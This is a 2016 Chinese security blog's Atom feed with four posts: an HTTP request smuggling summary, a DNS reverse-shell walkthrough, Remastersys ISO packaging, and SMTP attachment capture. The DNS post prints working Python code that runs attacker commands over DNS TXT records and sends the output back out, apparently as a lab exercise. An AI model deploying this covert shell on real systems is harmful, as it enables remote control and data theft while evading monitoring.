<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>零の杂货铺</title>
  <subtitle>Free and Share</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://phantom0301.github.io/"/>
  <updated>2016-09-19T13:27:33.228Z</updated>
  <id>http://phantom0301.github.io/</id>
  
  <author>
    <name>Phantom</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>没能复现的学习——DEFCON-HTTP-Smuggling</title>
    <link href="http://phantom0301.github.io/2016/09/12/httpsmuggling/"/>
    <id>http://phantom0301.github.io/2016/09/12/httpsmuggling/</id>
    <published>2016-09-12T12:44:03.000Z</published>
    <updated>2016-09-19T13:27:33.228Z</updated>
    
    <content type="html">&lt;p&gt;这篇文章主体框架来自@regilero在DEFCON上的议题-HTTP smuggling is a thing we should know better and care about.&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-闲扯Host-header&quot;&gt;&lt;a href=&quot;#0x00-闲扯Host-header&quot; class=&quot;headerlink&quot; title=&quot;0x00 闲扯Host header&quot;&gt;&lt;/a&gt;0x00 闲扯Host header&lt;/h2&gt;&lt;p&gt;作为重度网络依赖人群，我们每天都使用程序将数百次网页请求抛送到无形的网络空间中去，我们告知网络服务器我们要访问的资源，接受何种格式、何种语言的回应，是否要和服务器维持一段时间的连接，是否需要保存一些状态以及告知服务器你的代理发送人（浏览器或其他）身份。但是我们了解我们发送的这些东西的真正含义吗？&lt;/p&gt;
&lt;p&gt;其实作为一次网页请求，理论上我们只要告诉服务器我们要的资源url就可以。那么那些多余的键值大体起什么作用呢？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Accept族，这里的一系列字段决定了客户端接收的类型、压缩方式、字符集、语言等。这一类字段似乎是为了客户体验而产生的，它允许客户对自己喜欢的语言、字符集进行选择，并且提供选择因子“q”来界定对不同资源的喜好程度，q值越大越喜爱。而压缩则提供了更小的带宽占用和更快的访问速度。&lt;/li&gt;
&lt;li&gt;Cache-Control，缓存控制机制&lt;/li&gt;
&lt;li&gt;Connection,通常的参数会使用Keep-Alive，这个字段实际上算是对HTTP基础的补充，通过这个字段来使客户端到服务端的连接持续有效。而这个字段就是下面所描述问题的基础之一&lt;/li&gt;
&lt;li&gt;Cookie，用户体验与隐私、安全势不两立的存在，被广泛研究介绍，就不用多说了。&lt;/li&gt;
&lt;li&gt;User-Agent，这也是一个有意思的参数，它的存在最早是为了允许服务端差异化的提供页面，根据不同的框架提供不同的页面来适配不同的浏览器。最初，UA还是很单纯的，当时某些浏览器拥有了很好的显示效果，于是服务端检测到它们的时候就提供更好的页面，过了一段时间其他浏览器也有了相似的特性，为了也能够得到同样的页面，就会告诉浏览器自己和别人身份其实差不多，请给我优秀的页面，久而久之，大家的身份相互混来混去，于是大家都叫Mozilla了，然后又like上Gecko……就这样，UA不在那么单纯，浏览器们都充满了套路。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160905203128.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-HTTP-Pipeline&quot;&gt;&lt;a href=&quot;#0x01-HTTP-Pipeline&quot; class=&quot;headerlink&quot; title=&quot;0x01 HTTP Pipeline&quot;&gt;&lt;/a&gt;0x01 HTTP Pipeline&lt;/h2&gt;&lt;p&gt;HTTP管线化是作者提到的又一个漏洞基础，管线化使得多个HTTP请求不需要等待应答即可发送，使用这一技术的初衷是提高页面的载入性能，通过一个数据包来发送多个HTTP请求，也可以减轻网络负载压力。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160907214856.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是在一次管线化测试中捕获的HTTP包，可以很清晰的看出在这一个TCP包中拥有三个HTTP包。作者把Pipelines称为大多数smuggling问题之源。在我们实际的使用过程中，实际上并没有真正用到这一技术，因为大多数的浏览器默认并不使用HTTP Pipeline。但是实际上根据文档说明，大多数的服务端都应该支持这一技术。&lt;/p&gt;
&lt;p&gt;对于Pipeline技术而言，虽然同时发出多个HTTP请求，但实际上它们还是有先后顺序的，而回应顺序与发送的先后顺序一致。&lt;/p&gt;
&lt;h2 id=&quot;0x02-HTTP-Smuggling-协议层面攻击&quot;&gt;&lt;a href=&quot;#0x02-HTTP-Smuggling-协议层面攻击&quot; class=&quot;headerlink&quot; title=&quot;0x02 HTTP Smuggling 协议层面攻击&quot;&gt;&lt;/a&gt;0x02 HTTP Smuggling 协议层面攻击&lt;/h2&gt;&lt;p&gt;前面说到了HTTP Smuggling的两个基础是Header中的keep-alive和pipelining技术，而产生矛盾就产生于客户端与服务器通信经过中间代理这样的结构。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;client——&amp;gt;middleware——&amp;gt;server
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当客户端和代理通信时会使用Pipeline，而代理和服务器通信会保持keep-alive但不会使用Pipeline，而服务端不会意识到这一点，这就会造成两次不一样的请求通过构造会被服务端认为是同一次请求。&lt;/p&gt;
&lt;p&gt;所以进行smuggling的过程就是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端发送一个Pipelining的包，里面包含一个有效包和若干无效的http包。&lt;/li&gt;
&lt;li&gt;请求包顺利通过中间件&lt;/li&gt;
&lt;li&gt;服务端解析分割了请求包&lt;/li&gt;
&lt;li&gt;由于错误，请求被服务端部分回应后，服务端认为Keep-alive依然连接，并且使用了Pipelining，于是等待下面的包。&lt;/li&gt;
&lt;li&gt;而下一个包就不一定是攻击者发送来的，但是作为服务端依然把这个包回应给了攻击者。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在这里，作者告诉我们其实早在2005年，就已经有人提到了这种利用手法，最终可以造成的效果包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个forbidden回复&lt;/li&gt;
&lt;li&gt;DOS掉一台过程中的机器&lt;/li&gt;
&lt;li&gt;缓存投毒&lt;/li&gt;
&lt;li&gt;劫持用户凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来的是作者的Demo展示，可惜作者在这里使用go语言和Nodejs来编写中间件和服务端，并没能在本地环境复现作者的手法，这个只能等到以后回顾的时候再来复现了。&lt;/p&gt;
&lt;h2 id=&quot;0x03-期待的工具-HTTPWookiee&quot;&gt;&lt;a href=&quot;#0x03-期待的工具-HTTPWookiee&quot; class=&quot;headerlink&quot; title=&quot;0x03 期待的工具 HTTPWookiee&quot;&gt;&lt;/a&gt;0x03 期待的工具 HTTPWookiee&lt;/h2&gt;&lt;p&gt;作者在最后还许了一个愿，他会在考虑安全因素的条件下在Github上放出一个相关漏洞代理的自动化测试工具，不过已经过去一个月了吧。&lt;/p&gt;
&lt;p&gt;看作者的框图，这应该是一个通过发包、接受回应比对来判别代理漏洞利用的工具吧。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章主体框架来自@regilero在DEFCON上的议题-HTTP smuggling is a thing we should know better and care about.&lt;br&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.github.io/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="DEFCON" scheme="http://phantom0301.github.io/tags/DEFCON/"/>
    
      <category term="Smuggling" scheme="http://phantom0301.github.io/tags/Smuggling/"/>
    
      <category term="http" scheme="http://phantom0301.github.io/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>也说DNS反弹Shell</title>
    <link href="http://phantom0301.github.io/2016/08/11/DNSshell/"/>
    <id>http://phantom0301.github.io/2016/08/11/DNSshell/</id>
    <published>2016-08-11T12:03:39.000Z</published>
    <updated>2016-08-13T04:25:23.896Z</updated>
    
    <content type="html">&lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-引子&quot;&gt;&lt;a href=&quot;#0x01-引子&quot; class=&quot;headerlink&quot; title=&quot;0x01 引子&quot;&gt;&lt;/a&gt;0x01 引子&lt;/h2&gt;&lt;p&gt;反弹Shell广泛应用于远程控制下的权限维持，通过反转攻（客户端）和受（服务端）的角色，来实现条件限制，尤其是内网情况下的远程连接。&lt;/p&gt;
&lt;p&gt;反弹Shell的工具和实现方法多种多样，只要能够让被控端通过网络发送数据到控制端，并且实现数据的解析即可完成控制过程。&lt;/p&gt;
&lt;p&gt;最近在继续了解网络协议，于是突然想在DNS数据包中插入一些伪造的命令来实现解析，本来准备自己尝试写一个DNS服务器和DNS请求程序来实现反弹，不过刚动笔就看到了别人开源的程序，于是直接使用别人的程序来学习了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ahhh/Reverse_DNS_Shell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ahhh/Reverse_DNS_Shell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;为了运行测试更方便，去掉了程序中的加解密功能，额外的Python包只需要dns和dnslib&lt;/p&gt;
&lt;h2 id=&quot;0x02-DNS&quot;&gt;&lt;a href=&quot;#0x02-DNS&quot; class=&quot;headerlink&quot; title=&quot;0x02 DNS&quot;&gt;&lt;/a&gt;0x02 DNS&lt;/h2&gt;&lt;p&gt;为了关联主机和IP地址对应关系而诞生的DNS本身，不需要我在这里赘述了。跳过域名构成、查询过程等可以轻松在网络查询到的内容，我们直接来看看DNS的包构成&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160811202642.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在smtp那篇文章中，我们提过一层一层洋葱状的协议包裹，在这里，我们跳过以太、IP、UDP头，直接到DNS数据的部分。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标志着数据开始的是Tran ID段，所有的问答信息都需要一定的机制来保证对应，这部分应该就是对应机制中的一部分。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;紧接着的Flags，0x0100表明了一些查询属性。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Queries中是我们所要查询的host，查询类型。作为A类型查询，得到的是host的IP，这里也是我们做手脚的地方，不过TXT类型可以插入一些附加的信息，更适合我们用来构造命令语句。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务器回应包如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160812100828.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作为回应的Tran ID，它和查询包相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Flags中标准回应标志位&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;重复显示的Queries&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;回应的Answers信息。通过CNAME查取主机规范名，再通过规范名查取对应IP。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;利用这种相互应答的特性，我们初步计划通过以下流程来实现我们的反弹Shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;被控端：  发送DNS请求——&amp;gt;  接收回应并解析执行命令  ——&amp;gt;   发送DNS请求
              |                    /|\               |
              |                     |                |
              |                     |                |
             \|/                    |               \|/
控制端： 接收DNS请求并解析命令回显——发送添加了命令的回应——接收DNS并解析命令
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x03-程序&quot;&gt;&lt;a href=&quot;#0x03-程序&quot; class=&quot;headerlink&quot; title=&quot;0x03 程序&quot;&gt;&lt;/a&gt;0x03 程序&lt;/h2&gt;&lt;p&gt;原始的程序可以在上面的github中找到，这里贴出我们去掉加解密的部分程序。&lt;/p&gt;
&lt;p&gt;先说DNS服务器的部分&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def spawnShell(answer, payload):
  shellInput = raw_input(PROMPT)
  if shellInput == &amp;apos;quit&amp;apos;: EXIT = 1 
  if shellInput == &amp;apos;&amp;apos;: spawnShell(answer, payload) 
  out = base64.b64encode(shellInput)
  answer.add_answer(
     *dnslib.RR.fromZone(&amp;apos;{}.com 60 TXT &amp;quot;{}&amp;quot;&amp;apos;.format(payload, out)))
  return answer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这一部分封装了对DNS的应答，payload里是被控端发来的查询信息，也就是上一次命令执行后的回显，而out是我们这一次的命令，封装成了TXT的应答包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def recievePayload(udps):
  data, addr = udps.recvfrom(1024)
  dnsD = dnslib.DNSRecord.parse(data)
  payload = dnsD.questions[0].qname.label[0]
  answer = dnsD.reply()
  return addr, payload, answer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分对于被控端的查询包进行解析，从中获取到地址和数据，对于数据，解析出其中的命令回显，并且初始化一个应答包。&lt;/p&gt;
&lt;p&gt;主函数中使用socket监听相关端口，对于监听到的包按照预定流程进行处理。&lt;/p&gt;
&lt;p&gt;再来看看被控端发送的部分&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def start(host):
  while 1:
    a = startConnection(host)
    cmd = parseCmd(a)
    stdoutput = runCmd(cmd)
    sendOutputToServer(stdoutput, host)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;首先是整个流程一览，从程序中可以很清晰的看到建立连接，解析命令，执行命令，发送回显的过程。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def startConnection(host):
  url = formURL(nextCommand)
  request = dns.message.make_query(url, dns.rdatatype.TXT)
  answers = dns.query.udp(request, host)
  a = answers.to_text()
  return a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;构造的url，也就是命令回显，对于没有命令的，会返回nxt。利用回显构造查询语句。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def parseCmd(a):
def runCmd(cmd)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这两段程序对于收到的文本格式的命令进行解析和执行，没有太多的东西可以讲。只是注意格式的截取，并且考虑对Linux和Windows的命令之间转换。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def sendOutputToServer(output, host):
  send =&amp;apos;&amp;apos;
  output_end = len(output)
  for chunk in output:
    send += chunk
    output_end -= 1
    if len(send) == 58:
      url = formURL(send)
      dnsMakeQuery(url, host)
      send =&amp;apos;&amp;apos;
    if output_end == 0:
      url = formURL(send)
      dnsMakeQuery(url, host)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分负责发送DNS查询，按照与服务器约定的格式构造包并且进行发送。&lt;/p&gt;
&lt;h2 id=&quot;0x04-测试&quot;&gt;&lt;a href=&quot;#0x04-测试&quot; class=&quot;headerlink&quot; title=&quot;0x04 测试&quot;&gt;&lt;/a&gt;0x04 测试&lt;/h2&gt;&lt;p&gt;我们需要先执行服务器端程序，然后执行被控端程序。我的服务端程序在一台Ubuntu主机上，被控端在我的Win10机器上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121502.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如图，是在Ubuntu上对Win10执行ipconfig命令的显示。&lt;/p&gt;
&lt;p&gt;我们再进行抓包分析：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121742.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是被控端第一次连接时发送的包，因为控制端还没有指令，第一次连接发送的是空包，其中Name的值bnh0就是我之前所说的NXT&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121858.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;而第二个包就是控制端发送的指令，在TXT中发送的就是指令whoami的base64编码，&lt;/p&gt;
&lt;p&gt;可以对比和我之前实际抓包的不同之处，对照可以看出我们在DNS包的哪些地方做过修改。&lt;/p&gt;
&lt;h2 id=&quot;0x05-延伸&quot;&gt;&lt;a href=&quot;#0x05-延伸&quot; class=&quot;headerlink&quot; title=&quot;0x05 延伸&quot;&gt;&lt;/a&gt;0x05 延伸&lt;/h2&gt;&lt;p&gt;其实相关的DNS隧道技术原理应该差不多，都是在本来应该放DNS规定信息的地方放入了其他的东西，来达到一些意想不到的结果。&lt;/p&gt;
&lt;p&gt;当然，RFC还有许多协议可以让我随意构造去做测试，下一步考虑写一个多协议支持的Fuzzing工具   ：）&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.github.io/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="DNS" scheme="http://phantom0301.github.io/tags/DNS/"/>
    
      <category term="协议分析" scheme="http://phantom0301.github.io/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu服务器下Remastersys系统打包</title>
    <link href="http://phantom0301.github.io/2016/08/08/Remastersys/"/>
    <id>http://phantom0301.github.io/2016/08/08/Remastersys/</id>
    <published>2016-08-08T13:08:13.000Z</published>
    <updated>2016-08-08T13:32:18.906Z</updated>
    
    <content type="html">&lt;p&gt;在不稳定的网络环境下，多次反复安装才组建完成的环境支持完美的Ubuntu系统，怎么能够让痛苦的安装过程轮回发生呢？使用Remastersys打包你的系统，进而分发给需要它的小伙伴吧。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-安装&quot;&gt;&lt;a href=&quot;#0x01-安装&quot; class=&quot;headerlink&quot; title=&quot;0x01 安装&quot;&gt;&lt;/a&gt;0x01 安装&lt;/h2&gt;&lt;p&gt;这里主要是对使用过程中收集到资料的总结。主要是经过了测试。&lt;/p&gt;
&lt;p&gt;我的系统是官网下下来的Ubuntu server14.04。&lt;/p&gt;
&lt;p&gt;首先，网上大多数的教程使用添加非官方源的方法自动安装，我在添加密钥时迷之失败了，所以使用下面这篇博客的方法成功率更高。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/chenkun1/p/5532977.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/chenkun1/p/5532977.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;访问&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.filewatcher.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.filewatcher.com  &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;搜索&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;remastersys_3.0.4-2_all.deb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;考虑若干年后有可能找不到资源，我会上传一份到我的github&lt;/p&gt;
&lt;p&gt;下载安装包后，存放到合适的目录，在目录下执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install plymouth-x11 
sudo dpkg -i remastersys_3.0.4-2_all.deb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，就可以执行remastersys指令。&lt;/p&gt;
&lt;h2 id=&quot;0x02-使用&quot;&gt;&lt;a href=&quot;#0x02-使用&quot; class=&quot;headerlink&quot; title=&quot;0x02 使用&quot;&gt;&lt;/a&gt;0x02 使用&lt;/h2&gt;&lt;p&gt;具体指令的解释，网上有很多。大致我们会用到backup和dist两种方式，backup可以说是对整个系统完全打包，考虑到我们并不需要泄露自己的个人信息，大多数时候我们是使用dist方式做发行&lt;/p&gt;
&lt;p&gt;参考这篇文章，不过文章里有指令打错了，请注意。&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/kulin/archive/2012/07/27/Custom_UbuntuLiveCD_Remastersys.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/kulin/archive/2012/07/27/Custom_UbuntuLiveCD_Remastersys.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单说，我们顺序执行以下几条命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo remastersys dist cdfs
sudo remastersys dist iso filename.iso
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将iso移动到安全的地方后，执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo remastersys clean
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;清理掉生成iso时的辅助文件，当然，iso也会被删掉，所以请先将iso移动到安全的地方。&lt;/p&gt;
&lt;h2 id=&quot;0x03-问题&quot;&gt;&lt;a href=&quot;#0x03-问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 问题&quot;&gt;&lt;/a&gt;0x03 问题&lt;/h2&gt;&lt;p&gt;做为服务器版，我在执行 &lt;em&gt;remastersys dist cdfs&lt;/em&gt; 命令时报错，根据报错信息中提到的 &lt;em&gt;ubiquity&lt;/em&gt; 信息，我找到了如下的解决方法：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/zgyrelax/article/details/18228629&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/zgyrelax/article/details/18228629&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单粗暴点，你需要做的就是执行下面的这条命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get -y install ubiquity*
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，系统会提示你安装相关环境，接着执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get -f install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等到一切安装结束后，再次执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo remastersys dist cdfs
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以及后面的步骤，就可以顺利打包系统。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在不稳定的网络环境下，多次反复安装才组建完成的环境支持完美的Ubuntu系统，怎么能够让痛苦的安装过程轮回发生呢？使用Remastersys打包你的系统，进而分发给需要它的小伙伴吧。&lt;br&gt;
    
    </summary>
    
      <category term="ubuntu" scheme="http://phantom0301.github.io/categories/ubuntu/"/>
    
    
      <category term="iso" scheme="http://phantom0301.github.io/tags/iso/"/>
    
      <category term="ubuntu" scheme="http://phantom0301.github.io/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>SMTP协议附件数据流抓取与还原</title>
    <link href="http://phantom0301.github.io/2016/08/01/SMTP/"/>
    <id>http://phantom0301.github.io/2016/08/01/SMTP/</id>
    <published>2016-08-01T13:00:54.000Z</published>
    <updated>2016-08-04T07:51:15.196Z</updated>
    
    <content type="html">&lt;p&gt;SMTP作为一种广泛使用的文件传输协议，已经和POP等协议一同构成了电子邮件系统传输的基石，针对于协议的分析也有很多书籍和博文可以参考，但是在这当中，对于MIME附件的数据流还原能找到的参考不多，所以在这里记下实践心得。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x00-基础知识&quot;&gt;&lt;a href=&quot;#0x00-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x00 基础知识&quot;&gt;&lt;/a&gt;0x00 基础知识&lt;/h2&gt;&lt;p&gt;1.数据包的层级关系&lt;/p&gt;
&lt;p&gt;SMTP通过TCP协议进行传输，在这之前不得不再复习一下数据包的构成关系。&lt;/p&gt;
&lt;p&gt;一个典型的SMTP包将会由一下几部分构成：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Ethernet{首部，数据部（IP{首部，数据部（TCP{首部，数据部}）}）}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从上面的结构可以看出数据链路层、网络层、传输层上面的协议是嵌套关系，高层次的完整数据包作为底层次协议中的数据部。&lt;/p&gt;
&lt;p&gt;打个比方，如果我们要发送“Hello World！”的信息，正文信息将会在编码后加上TCP头成为TCP包，而TCP包会作为IP包的数据部，和IP头组成IP包，以此类推，以太网包就是首部加上IP包。&lt;/p&gt;
&lt;p&gt;不同的层次被赋予了不同的职责，我们要传送的实体信息是一切的基石，TCP头则负责告知收发双方的端口号并通过序号和校验保证数据的顺序和完整性；IP头负责告知收发双方的IP地址；eth头负责告知收发双发的MAC地址。&lt;/p&gt;
&lt;p&gt;2.SMTP协议&lt;/p&gt;
&lt;p&gt;SMTP协议的具体含义网上可以很轻易的得到。&lt;/p&gt;
&lt;p&gt;这里插一句，早期的SMTP实现过程是这样的，发送方写好一份邮件存在自己的硬盘上，通过TCP连接直接将邮件转到接收者的硬盘中，如果发送成功，发送者的硬盘就会删除邮件。否则，将会等待重发。&lt;/p&gt;
&lt;p&gt;很明显，上述实现过程在现代复杂网络中已经显得十分简陋，其他的先不说，这种机制首先必须要求收发方都要在线，这大大制约了电子邮件的发送。因此，邮件服务器就应运而生，二十四小时持续运转的邮件服务器可以使得邮件的发送不用在收到时间的限制。电子邮件系统雏形也就这样诞生了。&lt;/p&gt;
&lt;p&gt;由于需要与邮件服务器交流，便产生了相应的操作指令和状态码，详细的操作指令和状态码也可以很容易的从网络获得。今天，当我们发送邮件时，邮件客户端帮我们完成了SMTP指令的交互，我们只需要关系邮件实体的相关内容即可。&lt;/p&gt;
&lt;p&gt;3.MIME格式&lt;/p&gt;
&lt;p&gt;最初的邮件只能传输文本，这显然无法满足我们的交流需求。MIME的出现就是为了丰富邮件传输的类型，与此同时，我们可以在邮件附件中添加图片、动画、声音和程序。&lt;/p&gt;
&lt;p&gt;MIME主要由首部和正文组成，通过“Content-Type”确定发送富文本的类型，常用的类型有：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;text/plain  纯文本
mutipart/mixed  多部分组成
application/octet-stream  二进制数据
image/jpeg  jpeg图像
video/mpeg  mpeg动画
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当声明为多部分组成时，通过“boundary”来进行分割。&lt;/p&gt;
&lt;h2 id=&quot;0x01-邮件发送&quot;&gt;&lt;a href=&quot;#0x01-邮件发送&quot; class=&quot;headerlink&quot; title=&quot;0x01 邮件发送&quot;&gt;&lt;/a&gt;0x01 邮件发送&lt;/h2&gt;&lt;p&gt;为了便于我们进行分析，我们在本地的另一台Ubuntu主机上搭建SMTP服务器，通过Python程序在本机上发送邮件到Ubuntu主机上，这样就能实现一个可控的操作环境。&lt;/p&gt;
&lt;p&gt;在Ubuntu上安装Postfix和SMTP服务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install postfix
apt-get install mailutils
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完成之后，我们可以在本机上使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;telnet Ubuntu的IP 25
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;来验证是否搭建成功&lt;/p&gt;
&lt;p&gt;搭建完成后我们来编写一个可以传输MIME附件的Pyhton程序，关键代码如下：&lt;br&gt;需要的Python库&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.header import Header
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先初始化发送邮箱，邮件服务器，邮箱认证账号密码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def init():  
    sender = 
    smtpserver = 
    username = 
    password = 
    return sender, smtpserver, username, password
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发送部分调用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msg = MIMEMultipart(&amp;apos;alternative&amp;apos;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在msg中添加邮件来源、主题、正文内容。附件部分这样处理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;att = MIMEText(open(&amp;apos;1.jpg&amp;apos;, &amp;apos;rb&amp;apos;).read(), &amp;apos;base64&amp;apos;, &amp;apos;utf-8&amp;apos;)
att[&amp;quot;Content-Type&amp;quot;] = &amp;apos;application/octet-stream&amp;apos;
att[&amp;quot;Content-Disposition&amp;quot;] = &amp;apos;attachment;filename=&amp;quot;1.jpg&amp;quot;&amp;apos;
msg.attach(att)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;信息添加完整后，调用smtp来发送&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;smtp = smtplib.SMTP()
smtp.connect(&amp;apos;邮件服务器地址&amp;apos;)
smtp.login(username, password)
smtp.sendmail(sender, receiver, msg.as_string())
smtp.quit()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;整个实践的基础环境就可用了。&lt;/p&gt;
